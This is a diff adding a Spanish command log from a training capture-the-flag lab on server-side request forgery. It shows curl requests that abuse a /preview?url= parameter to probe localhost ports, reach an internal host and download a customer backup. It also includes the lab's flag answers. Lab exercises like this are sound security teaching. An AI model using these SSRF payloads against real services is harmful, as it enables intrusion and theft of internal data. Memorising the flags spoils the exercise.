@@ -1,0 +1,26 @@
+# Comandos ejecutados — Lab Extra SSRF — grupo 02
+# Todos desde la consola del atacante (make shell -> cyberlab-attacker).
+
+# Preparacion (raiz del repo)
+./ctf lab extra                                   # levanta web publica + intranet (redes segmentadas)
+make shell                                        # consola atacante
+
+# 0. Reconocimiento
+curl -s http://phantomcorp/                       # el portal publico -> hay /preview
+curl -s --max-time 3 http://phantomcorp-intra/    # timeout/sin ruta: la intranet NO es alcanzable directo
+
+# R1 — SSRF a localhost (oraculo de puertos por mensajes de error)
+curl -s "http://phantomcorp/preview?url=http://127.0.0.1:9999/"   # cerrado -> Connection refused
+curl -s "http://phantomcorp/preview?url=http://127.0.0.1:9000/"   # abierto -> panel interno + FLAG{ssrf_localhost_panel_interno}
+
+# R2 — SSRF a la red interna (nombre interno conocido de otros labs: phantomcorp-*)
+curl -s "http://phantomcorp/preview?url=http://phantomcorp-intra/"   # FLAG{ssrf_intranet_descubierta}
+
+# R3 — exfiltracion del backup via SSRF
+curl -s "http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"   # FLAG{ssrf_backup_clientes} + CUITs
+
+# Entrega de flags
+./ctf submit extra R1 'FLAG{ssrf_localhost_panel_interno}'
+./ctf submit extra R2 'FLAG{ssrf_intranet_descubierta}'
+./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'
+./ctf status extra
